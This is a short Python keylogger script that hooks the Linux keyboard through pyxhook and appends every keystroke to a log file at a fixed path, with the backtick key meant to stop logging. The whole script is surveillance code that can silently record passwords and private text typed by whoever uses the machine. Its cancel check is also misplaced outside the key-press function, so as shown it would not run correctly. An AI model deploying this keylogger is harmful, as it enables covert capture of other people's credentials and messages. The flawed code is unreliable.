#Python Library used to listen to keyboard events on linux
import pyxhook

#change this according to the location you need to save the log file that records keystrokes
logfile='/home/abhiven/Desktop/abhilog.log'

#Function that's called everytime a key is pressed.
def OnKeyPress(event):
  f=open(logfile,'a')
  f.write(event.Key)
  f.write('\n')

# ` key to cancel keystrokes
if event.Ascii==96: 
    f.close()
    new_hook.cancel()

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()